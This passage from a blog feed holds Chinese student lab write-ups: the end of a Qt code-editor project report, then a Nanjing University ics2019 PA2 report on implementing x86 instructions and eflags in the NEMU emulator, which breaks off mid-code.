class="hljs-string">")"</span>)) {            <span class="hljs-comment">// only need to auto indent when the previous character is ')', which means it is a function</span>            <span class="hljs-keyword">auto</span> pos = cursor.<span class="hljs-built_in">position</span>();            cursor.<span class="hljs-built_in">setPosition</span>(pos, cursor.MoveAnchor);            cursor.<span class="hljs-built_in">insertText</span>(<span class="hljs-string">"{\n"</span>);            <span class="hljs-type">int</span> indentation = <span class="hljs-built_in">getIndentation</span>(cursor);            cursor.<span class="hljs-built_in">insertText</span>(<span class="hljs-built_in">QString</span>(<span class="hljs-string">" "</span>).<span class="hljs-built_in">repeated</span>(indentation));            cursor.<span class="hljs-built_in">insertText</span>(<span class="hljs-string">"\n"</span>);            cursor.<span class="hljs-built_in">insertText</span>(<span class="hljs-built_in">QString</span>(<span class="hljs-string">" "</span>).<span class="hljs-built_in">repeated</span>(indentation - <span class="hljs-number">4</span>));            cursor.<span class="hljs-built_in">insertText</span>(<span class="hljs-string">"}"</span>);            cursor.<span class="hljs-built_in">setPosition</span>(pos + <span class="hljs-number">2</span> + indentation, cursor.MoveAnchor);        } <span class="hljs-keyword">else</span> {            <span class="hljs-keyword">auto</span> pos = cursor.<span class="hljs-built_in">position</span>();            cursor.<span class="hljs-built_in">setPosition</span>(pos, cursor.MoveAnchor);            cursor.<span class="hljs-built_in">insertText</span>(startStr + endStr);            cursor.<span class="hljs-built_in">setPosition</span>(pos + <span class="hljs-number">1</span>, cursor.MoveAnchor);        }    } <span class="hljs-keyword">else</span> {        <span class="hljs-keyword">auto</span> pos = cursor.<span class="hljs-built_in">position</span>();        cursor.<span class="hljs-built_in">setPosition</span>(pos, cursor.MoveAnchor);        cursor.<span class="hljs-built_in">insertText</span>(startStr + endStr);        cursor.<span class="hljs-built_in">setPosition</span>(pos + <span class="hljs-number">1</span>, cursor.MoveAnchor);    }    <span class="hljs-built_in">setTextCursor</span>(cursor);}</code></pre></div></div><h2 id="单元测试及收获">单元测试及收获</h2><p>如<a href="https://nju-projectn.github.io/ics-pa-gitbook/ics2019/1.5.html">PA</a>中所述，未经测试的代码永远是错的。尽管已经在编写代码中进行了大量单元测试，在此一一列举出成功的样例也没有意义。这一部分可以参见项目视频。而且我们只是体会文本编辑器的工作方式和原理，而非真的去造这么一个轮子出来，像PA中提到的<a href="https://nju-projectn.github.io/ics-pa-gitbook/ics2019/1.5.html">KISS法则</a>样，只是实现了最基础的功能，更高级的设计，安全甚至性能都不是在一开始的实现过程需要考虑的，追求面面俱到只会增加代码维护的难度。即便如此，由于时间仓促，前面的分析可以看到，设计上仍旧有失误，也难免会出现这样那样未全面测试到的问题。当然，这个项目除了完成作业以外纯粹是兴趣驱动，没有功利性的目的，更没有任何实际价值(我们为什么不用VSCode呢)，因此暂时就容许这些失误出现吧(毕竟还有很多更重要的事情要做)，后续对bug的修复和对代码的重构在自己功力更深厚，思路更清晰的时候做，会更容易一些。</p><h2 id="借物表">借物表</h2><p><a href="https://www.bilibili.com/video/BV16M4y167tB/?spm_id_from=333.999.0.0">续加仪</a>的代码编辑器给了我灵感和启动项目的动力。基本的高亮部分和行号绘制部分参考了这个项目。</p><p><a href="https://jetbrains.design/intellij/resources/icons_list/">JetBrainsIcons</a></p><p><a href="https://github.com/microsoft/vscode-icons">VSCodeIcons</a></p>]]></content>
    
    
    <categories>
      
      <category>作业</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>南京大学ics2019_PA2</title>
    <link href="/posts/44749/"/>
    <url>/posts/44749/</url>
    
    <content type="html"><![CDATA[<h1 id="pa2实验报告">PA2实验报告</h1><p>2013599 田佳业</p><h2 id="关于pa究竟整了个什么的问题">关于PA究竟整了个什么的问题</h2><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210933443509_251_20230523225355617758_115_image-20230417214640107.png" alt="image-20230417214640107"><figcaption aria-hidden="true">image-20230417214640107</figcaption></figure><h2 id="一阶段">一阶段</h2><h3 id="任务">任务</h3><p>熟悉添加指令的流程，完成<code>dummy</code>程序运行。并且真正学会RTFM。</p><h4 id="遇到的问题">遇到的问题</h4><p>1.运行<code>make ARCH=x86-nemu ALL=dummy run</code>出现如图所示错误:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-mbh5ymlluwpkzu"></i><span>shell</span><div class="collapse show" id="collapse-mbh5ymlluwpkzu"><pre><code class="hljs shell">fatal error: bits/libc-header-start.h: No such file or directory</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210935594767_446_20230523225359236876_857_image-20230416202629539.png" alt="image-20230416202629539"><figcaption aria-hidden="true">image-20230416202629539</figcaption></figure><p>解决方法:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-y3h54nlluwpkzu"></i><span>shell</span><div class="collapse show" id="collapse-y3h54nlluwpkzu"><pre><code class="hljs shell">sudo apt-get install gcc-multilib</code></pre></div></div><p>因为我们是要模拟一个i386的isa，它是32位的。</p><p>之后又遇到下述错误:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-sodbrwlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-sodbrwlluwpkzu"><pre><code class="hljs C++">/home/lunaticsky/ics2019/nexus-am/am/src/nemu-common/trm.c: In function ‘_trm_init’:/home/lunaticsky/ics2019/nexus-am/am/src/nemu-common/trm.c:<span class="hljs-number">26</span>:<span class="hljs-number">15</span>: error: array subscript <span class="hljs-number">-1048576</span> is outside array bounds of ‘<span class="hljs-type">const</span> <span class="hljs-type">char</span>[<span class="hljs-number">1</span>]’ [-Werror=array-bounds]   <span class="hljs-number">26</span> |   <span class="hljs-type">const</span> <span class="hljs-type">char</span> *mainargs = &amp;_start - <span class="hljs-number">0x100000</span>;      |               ^~~~~~~~/home/lunaticsky/ics2019/nexus-am/am/src/nemu-common/trm.c:<span class="hljs-number">25</span>:<span class="hljs-number">21</span>: note: <span class="hljs-keyword">while</span> referencing ‘_start’   <span class="hljs-number">25</span> |   <span class="hljs-keyword">extern</span> <span class="hljs-type">const</span> <span class="hljs-type">char</span> _start;      |                     ^~~~~~</code></pre></div></div><p>这个错误并没有找到理想的解决方法。为了能够继续完成实验，只好把<code>Makefile.compile</code>的<code>Werror</code>编译选项去掉了。这不是一个优雅的解决方案。</p><p>2.按照问题汇总<code>trm_init 和 main 函数的开头出现 endbr32 指令</code>部分</p><p>在 AM_HOME/makefile.compile 文件中，在和 nemu 有关的 CFLAGS后面添加-fcf-protection=none和-mmanual-endbr的方法修改后makefile报错</p><p>加了换行没加反斜杠。。</p><h4 id="实现新指令">实现新指令</h4><p>可以看到第一个我们需要实现的指令是<code>call</code>指令。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210936480131_528_20230523225403430212_787_image-20230416203550556.png" alt="image-20230416203550556"><figcaption aria-hidden="true">image-20230416203550556</figcaption></figure><p>首先在<code>nemu/src/isa/x86/exec/all-instr.h</code>把需要实现的指令声明。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210937636344_421_20230523225407881850_360_image-20230416230556955.png" alt="image-20230416230556955"><figcaption aria-hidden="true">image-20230416230556955</figcaption></figure><h5 id="call_prepare">call_prepare</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210938436096_558_20230523225409905724_209_image-20230416215526140.png" alt="image-20230416215526140"><figcaption aria-hidden="true">image-20230416215526140</figcaption></figure><p>这里顺带把后面几个可能用到的也填了:</p><p>可以这些<code>opcode</code>都是单字节的，填<code>opcode_table</code>的时候千万不要错填到2字节部分！</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-j7uatmlluwpkzu"></i><span>c</span><div class="collapse show" id="collapse-j7uatmlluwpkzu"><pre><code class="hljs c"><span class="hljs-comment">/* 0xe8 */</span>IDEX(I,call), IDEX(J,jmp), EMPTY, IDEXW(J,jmp,<span class="hljs-number">1</span>),</code></pre></div></div><p>显然call 指令的实现中需要使用压栈操作，因此先去实现push指令。</p><h5 id="push_prepare">push_prepare</h5><p>这个指令学长贴心的给出了勘误:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210939643621_797_20230523225414254273_952_image-20230416213829809.png" alt="image-20230416213829809"><figcaption aria-hidden="true">image-20230416213829809</figcaption></figure><p>填<code>opcode_table</code></p><p><code>nemu/src/isa/x86/exec/exec.c</code></p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-8gngf0lluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-8gngf0lluwpkzu"><pre><code class="hljs C++"><span class="hljs-comment">/* 0x50 */</span><span class="hljs-built_in">IDEX</span>(r, push), <span class="hljs-built_in">IDEX</span>(r, push), <span class="hljs-built_in">IDEX</span>(r, push), <span class="hljs-built_in">IDEX</span>(r, push),<span class="hljs-comment">/* 0x54 */</span><span class="hljs-built_in">IDEX</span>(r, push), <span class="hljs-built_in">IDEX</span>(r, push), <span class="hljs-built_in">IDEX</span>(r, push), <span class="hljs-built_in">IDEX</span>(r, push),</code></pre></div></div><p>ics2019把ISA相关的RTL伪指令放到了<code>nemu/src/isa/$ISA/include/isa/rtl.h</code>中定义，一开始去<code>nemu/include</code>没找到，后来发现指导手册里有说明，还是没仔细看。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-mpz92vlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-mpz92vlluwpkzu"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">rtl_push</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">rtlreg_t</span>* src1)</span> </span>{  <span class="hljs-comment">// esp &lt;- esp - 4</span>  <span class="hljs-comment">// M[esp] &lt;- src1</span>  <span class="hljs-comment">//TODO();</span>  <span class="hljs-built_in">rtl_subi</span>(&amp;cpu.esp, &amp;cpu.esp, <span class="hljs-number">4</span>);  <span class="hljs-built_in">rtl_sm</span>(&amp;cpu.esp, src1, <span class="hljs-number">4</span>);}</code></pre></div></div><p>而且一个坑是它的api和2018的是不一样的:</p><p>错误代码:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210940913969_388_20230523225417105196_820_image-20230416233834598.png" alt="image-20230416233834598"><figcaption aria-hidden="true">image-20230416233834598</figcaption></figure><p>于是开始寻找这个函数的原型。</p><p>这是2018版</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210941888400_540_20230523225419412587_384_image-20230416233012943.png" alt="image-20230416233012943"><figcaption aria-hidden="true">image-20230416233012943</figcaption></figure><p>2019版在Vsocde找了半天没找到，看到唯一一个框架代码给出的示例，发现含义确实和预想的不一样，最后一个参数才是长度。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210943221334_840_20230523225422546936_285_image-20230416233317635.png" alt="image-20230416233317635"><figcaption aria-hidden="true">image-20230416233317635</figcaption></figure><p>当然这个函数原型也是能找到的，只是因为<code>rtl-wrapper.h</code>做了包装，Vscode没法直接跳转而已。这个因为是体系结构抽象层的接口，在<code>nemu/include/rtl/rtl.h</code>里面。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210944258582_792_20230523225426665320_827_image-20230416233126823.png" alt="image-20230416233126823"><figcaption aria-hidden="true">image-20230416233126823</figcaption></figure><h5 id="sub">sub</h5><p>然后这时候发现，我们想实现push，sub都没实现哩。开始折磨起来了。</p><p>sub本身的实现不难。因为实验代码中给了更复杂的<code>sbb</code>指令的实现，仿照即可。代码如下:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-9fj2oalluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-9fj2oalluwpkzu"><pre><code class="hljs C++"><span class="hljs-built_in">make_EHelper</span>(sub) {  <span class="hljs-comment">//TODO();</span><span class="hljs-built_in">rtl_sub</span>(&amp;s0,&amp;id_dest-&gt;val,&amp;id_src-&gt;val);<span class="hljs-built_in">rtl_update_ZFSF</span>(&amp;s0,id_dest-&gt;width);<span class="hljs-built_in">rtl_is_sub_carry</span>(&amp;s1,&amp;s0,&amp;id_dest-&gt;val);<span class="hljs-built_in">rtl_set_CF</span>(&amp;s1);<span class="hljs-built_in">rtl_is_sub_overflow</span>(&amp;s1,&amp;s0,&amp;id_dest-&gt;val,&amp;id_src-&gt;val,id_dest-&gt;width);        <span class="hljs-comment">//printf("%d %d\n",id_dest-&gt;val,id_src-&gt;val);assert(0);</span><span class="hljs-built_in">rtl_set_OF</span>(&amp;s1);<span class="hljs-built_in">operand_write</span>(id_dest,&amp;s0);<span class="hljs-built_in">print_asm_template2</span>(sub);}</code></pre></div></div><p>还要注意一点，在文档的附录里面说了，x86使用<code>ModR/M</code>字节中的扩展opcode域来对<code>opcode</code>的长度进行扩充.有些时候, 读入一个字节也还不能完全确定具体的指令形式,这时候需要读入紧跟在<code>opcode</code>后面的<code>ModR/M</code>字节,把其中的<code>reg/opcode</code>域当做<code>opcode</code>的一部分来解释,才能决定具体的指令形式. x86把这些指令划分成不同的指令组(instructiongroup)。</p><p>框架代码的<code>make_group</code>就是干这事的，不加跑不起来，因为译码的时候要用。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210945133885_542_20230523225429817644_186_image-20230417211556676.png" alt="image-20230417211556676"><figcaption aria-hidden="true">image-20230417211556676</figcaption></figure><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-lotq8zlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-lotq8zlluwpkzu"><pre><code class="hljs C++"><span class="hljs-comment">/* 0x80, 0x81, 0x83 */</span><span class="hljs-built_in">make_group</span>(gp1,    <span class="hljs-built_in">EX</span>(add), <span class="hljs-built_in">EX</span>(<span class="hljs-keyword">or</span>), <span class="hljs-built_in">EX</span>(adc), <span class="hljs-built_in">EX</span>(sbb),    <span class="hljs-built_in">EX</span>(<span class="hljs-keyword">and</span>), <span class="hljs-built_in">EX</span>(sub), <span class="hljs-built_in">EX</span>(<span class="hljs-keyword">xor</span>), <span class="hljs-built_in">EX</span>(cmp))</code></pre></div></div><p>这几个位置涉及到<a href="https://www.jianshu.com/p/b7c968baecaf">变长指令</a>，比如</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-xudnkllluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-xudnkllluwpkzu"><pre><code class="hljs C++"><span class="hljs-number">100017</span>:<span class="hljs-number">83</span> ec <span class="hljs-number">14</span>             sub    $<span class="hljs-number">0x14</span>,%esp</code></pre></div></div><p>就是这一类的。</p><p>实现<code>sub</code>的主要问题是还需要实现<code>eflags</code>。</p><h5 id="eflags">eflags</h5><p>eflags各位的含义</p><blockquote><p>CF(bit 0) [Carry flag]若算术操作产生的结果在最高有效位(most-significant bit)发生进位或借位则将其置 1，反之清零。这个标志指示无符号整型运算的溢出状态，这个标志同样在多倍精度运算(multiple-precision arithmetic)中使用。</p><p>ZF(bit 6) [Zero flag] 若结果为 0 则将其置 1，反之清零。</p><p>SF(bit 7) [Sign flag] 该标志被设置为有符号整型的最高有效位。(0指示结果为正，反之则为负)</p><p>IF(bit 9) [Interrupt enable flag]该标志用于控制处理器对可屏蔽中断请求(maskable interrupt requests)的响应。置 1 以响应可屏蔽中断，反之则禁止可屏蔽中断。</p><p>OF(bit 11) [Overflow flag]如果整型结果是较大的正数或较小的负数，并且无法匹配目的操作数时将该 位置1，反之清零。这个标志为带符号整型运算指示溢出状态。</p></blockquote><p>我们可以用<a href="https://zh.wikipedia.org/zh-hans/%E4%BD%8D%E6%AE%B5">位域</a>实现<code>eflag</code>结构，它本质上就是一个结构体。把它放到<code>CPU_state</code>结构体里面。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-wjsbfclluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-wjsbfclluwpkzu"><pre><code class="hljs C++"><span class="hljs-keyword">union</span>{    <span class="hljs-keyword">struct</span>{        <span class="hljs-type">uint32_t</span> CF:<span class="hljs-number">1</span>;        <span class="hljs-type">unsigned</span> :<span class="hljs-number">5</span>;        <span class="hljs-type">uint32_t</span> ZF:<span class="hljs-number">1</span>;        <span class="hljs-type">uint32_t</span> SF:<span class="hljs-number">1</span>;        <span class="hljs-type">unsigned</span> :<span class="hljs-number">1</span>;        <span class="hljs-type">uint32_t</span> IF:<span class="hljs-number">1</span>;        <span class="hljs-type">unsigned</span> :<span class="hljs-number">1</span>;        <span class="hljs-type">uint32_t</span> OF:<span class="hljs-number">1</span>;        <span class="hljs-type">signed</span> :<span class="hljs-number">20</span>;    };    <span class="hljs-type">uint32_t</span> val;}eflags;</code></pre></div></div><p>不要忘了eflags 的初始化。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-q0m9inlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-q0m9inlluwpkzu"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">restart</span><span class="hljs-params">()</span> </span>{  <span class="hljs-comment">/* Set the initial program counter. */</span>  cpu.pc = PC_START;  cpu.eflags.val = <span class="hljs-number">0x2</span>;  }</code></pre></div></div><p>这时候再运行，发现eflag更新相关的rtl方法还没实现。</p><p>下面是更新ZF标志的方法，根据不同长度判断相与是否为0.或许可以有更好的方法或者可以调用接口实现，不过如文档所说，先完成再完美。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-0tnjtglluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-0tnjtglluwpkzu"><pre><code class="hljs C++"><span class="hljs-keyword">switch</span> (width){<span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:{  t0 = (*result == <span class="hljs-number">0</span>);  <span class="hljs-built_in">rtl_set_ZF</span>(&amp;t0);  <span class="hljs-keyword">break</span>;}<span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:{  t0 = ((*result &amp; <span class="hljs-number">0xffff</span>) == <span class="hljs-number">0</span>);  <span class="hljs-built_in">rtl_set_ZF</span>(&amp;t0);  <span class="hljs-keyword">break</span>;}<span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:{  t0 = ((*result &amp; <span class="hljs-number">0xff</span>) == <span class="hljs-number">0</span>);  <span class="hljs-built_in">rtl_set_ZF</span>(&amp;t0);  <span class="hljs-keyword">break</span>;}<span class="hljs-keyword">default</span>:  <span class="hljs-built_in">assert</span>(<span class="hljs-number">0</span>);}</code></pre></div></div><p>框架还要求我们去实现一个设置标志位的宏。就连这么小的一个功能都要抽象成一个宏，而不是复制黏贴设置<code>src</code>和<code>dest</code>，相较文档中的哲学确实做到了言行一致。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-8nt32vlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-8nt32vlluwpkzu"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> make_rtl_setget_eflags(f) \</span><span class="hljs-meta">  static inline void concat(rtl_set_, f) (const rtlreg_t* src) { \</span><span class="hljs-meta">    cpu.eflags.f=*src; \</span><span class="hljs-meta">  } \</span><span class="hljs-meta">  static inline void concat(rtl_get_, f) (rtlreg_t* dest) { \</span><span class="hljs-meta">    *dest=cpu.eflags.f; \</span><span class="hljs-meta">  }</span></code></pre></div></div><p>中间还涉及要要求判断何时“溢出”和“借位”以及判断有效最高位。虽然计算机使用补码运算，没有“借位”这一概念，但减法变成补码加法运算的时候没进位，其实就是借位了。这一部分的实现是真·小学知识，但确实很琐碎，具体代码不在报告展示了。</p><h5 id="push">push</h5><p><code>nemu/src/isa/x86/exec/data-mov.c</code></p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-7trz3dlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-7trz3dlluwpkzu"><pre><code class="hljs C++"><span class="hljs-built_in">make_EHelper</span>(push) {  <span class="hljs-comment">//TODO();</span>  <span class="hljs-built_in">rtl_push</span>(&amp;id_dest -&gt; val);  <span class="hljs-built_in">print_asm_template1</span>(push); }</code></pre></div></div><h5 id="call">call</h5><p>下面就可以把<code>call</code>的<code>make_EHelper</code>补充完整了。ics2019为了照顾不同的ISA，相比2018改了一些变量名。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-vn6bcklluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-vn6bcklluwpkzu"><pre><code class="hljs C++"><span class="hljs-built_in">make_EHelper</span>(call) {  <span class="hljs-comment">// the target address is calculated at the decode stage</span> <span class="hljs-comment">// TODO();</span><span class="hljs-built_in">rtl_push</span>(pc); <span class="hljs-comment">//push pc</span>  <span class="hljs-built_in">rtl_j</span>(decinfo.jmp_pc); <span class="hljs-built_in">print_asm</span>(<span class="hljs-string">"call %x"</span>, decinfo.jmp_pc);}</code></pre></div></div><p>call指令是先将当前的pc压入栈中，再转移eip。转移eip这一步需要J指令。</p><p>J指令看上去已经实现好了，但是运行还是不正确。仔细想了一下指令的执行步骤，找了代码，发现连J的译码用到了<code>make_DopHelper(SI)</code>。连这个都得要求自己实现。</p><p>可以看到现在<code>call</code>指令已经能够运行了。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210946163716_943_20230523225433985560_176_image-20230417193049419.png" alt="image-20230417193049419"><figcaption aria-hidden="true">image-20230417193049419</figcaption></figure><p>可以看到<code>push</code>的实现并不完善，它没有识别到后面的立即数。通过操作码定位到发现是<code>make_DopHelper(SI)</code>函数实现出现了问题，改正即可。</p><p>整体来看，实现<code>call</code>的过程像是栈工作的过程:随着问题的发现任务栈逐渐加深，步步为营解决了细节问题之后，带领我们来到细节问题的，初看上去很吓人的问题也随之解决了(pop）。不管是做高中压轴题，做PA，还是学习新知识，做项目，经历了上山的过程才有下山的愉悦。</p><p>回到PA。这一阶段还没完呢矮油喂。。</p><h5 id="pop">pop</h5><p>pop的实现和push类似，虽然在一阶段用不到，反正迟早要做，就一起写了。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-3jqm2ylluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-3jqm2ylluwpkzu"><pre><code class="hljs C++"><span class="hljs-comment">/* 0x58 */</span><span class="hljs-built_in">IDEX</span>(r, pop), <span class="hljs-built_in">IDEX</span>(r, pop), <span class="hljs-built_in">IDEX</span>(r, pop), <span class="hljs-built_in">IDEX</span>(r, pop),<span class="hljs-comment">/* 0x5c */</span>EMPTY, <span class="hljs-built_in">IDEX</span>(r, pop), <span class="hljs-built_in">IDEX</span>(r, pop), <span class="hljs-built_in">IDEX</span>(r, pop),</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-qv6geqlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-qv6geqlluwpkzu"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">rtl_pop</span><span class="hljs-params">(<span class="hljs-type">rtlreg_t</span>* dest)</span> </span>{  <span class="hljs-comment">// dest &lt;- M[esp]</span>  <span class="hljs-comment">// esp &lt;- esp + 4</span>  <span class="hljs-comment">// TODO();</span>  <span class="hljs-built_in">rtl_lm</span>(dest, &amp;cpu.esp, <span class="hljs-number">4</span>);  <span class="hljs-built_in">rtl_addi</span>(&amp;cpu.esp, &amp;cpu.esp, <span class="hljs-number">4</span>);}</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-93iubwlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-93iubwlluwpkzu"><pre><code class="hljs C++"><span class="hljs-built_in">make_EHelper</span>(pop){  <span class="hljs-comment">// TODO();</span>  <span class="hljs-built_in">rtl_pop</span>(&amp;t0);                     <span class="hljs-comment">// register t0 is used according to the convention</span>  <span class="hljs-keyword">if</span> (id_dest-&gt;type == OP_TYPE_REG) <span class="hljs-comment">// dest is register, write to register</span>  {    <span class="hljs-built_in">rtl_sr</span>(id_dest-&gt;reg, id_dest-&gt;width, &amp;t0);  }  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (id_dest-&gt;type == OP_TYPE_MEM) <span class="hljs-comment">// dest is memory, write to memory</span>  {    <span class="hljs-built_in">rtl_sm</span>(&amp;id_dest-&gt;addr, id_dest-&gt;width, &amp;t0);  }  <span class="hljs-keyword">else</span>  {    <span class="hljs-comment">//should not reach here</span>    <span class="hljs-built_in">assert</span>(<span class="hljs-number">0</span>);  }  <span class="hljs-built_in">print_asm_template1</span>(pop);}</code></pre></div></div><h5 id="xor">xor</h5><p>现在来到了<code>xor</code>。经历了实现<code>call</code>指令的折磨，对实现<code>xor</code>也更有信心了。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210947894128_296_20230523225437555540_310_image-20230417195212809.png" alt="image-20230417195212809"><figcaption aria-hidden="true">image-20230417195212809</figcaption></figure><p><code>xor</code>的执行函数在<code>logic.c</code>里面。</p><p>仿照着写，并不难。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-2d4f0hlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-2d4f0hlluwpkzu"><pre><code class="hljs C++"><span class="hljs-built_in">make_EHelper</span>(<span class="hljs-keyword">xor</span>){<span class="hljs-built_in">rtl_li</span>(&amp;s1,<span class="hljs-number">0</span>);<span class="hljs-built_in">rtl_set_OF</span>(&amp;s1);<span class="hljs-built_in">rtl_set_CF</span>(&amp;s1);<span class="hljs-built_in">rtl_xor</span>(&amp;s0,&amp;id_dest-&gt;val,&amp;id_src-&gt;val);<span class="hljs-built_in">rtl_update_ZFSF</span>(&amp;s0,id_dest-&gt;width);<span class="hljs-built_in">operand_write</span>(id_dest,&amp;s0);<span class="hljs-built_in">print_asm_template2</span>(<span class="hljs-keyword">xor</span>);}</code></pre></div></div><p>对照手册，我们需要关心的<code>opcode</code>是<code>0x30-0x35</code>。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210949076005_747_20230523225440170402_511_image-20230417212128063.png" alt="image-20230417212128063"><figcaption aria-hidden="true">image-20230417212128063</figcaption></figure><h5 id="ret">ret</h5><p><code>dummy</code>跑通的临门一脚。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210950019919_424_20230523225442415385_539_image-20230417212351555.png" alt="image-20230417212351555"><figcaption aria-hidden="true">image-20230417212351555</figcaption></figure><p>先去附录找到c3对应的内容，定位到<code>ret</code>的页面:</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210950956612_740_20230523225446946199_759_image-20230417212512264.png" alt="image-20230417212512264" width="50%" height="50%"></p><p>可以看到<code>ret</code>有好几种形式。但是我们显然只需要实现<code>c3</code>就可以满足需要。</p><p>根据描述，C3 ret是用栈的数据修改IP的内容，实现近转移。</p><p>我们在操作系统课上学过，<code>ret</code>弹出栈中保存的<code>eip</code>，跳到对应地址就可以返回调用它的位置。注意设置跳转标志。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-cfajfdlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-cfajfdlluwpkzu"><pre><code class="hljs C++"><span class="hljs-built_in">make_EHelper</span>(ret){<span class="hljs-built_in">rtl_pop</span>(&amp;decinfo.jmp_pc);<span class="hljs-built_in">rtl_j</span>(decinfo.jmp_pc);<span 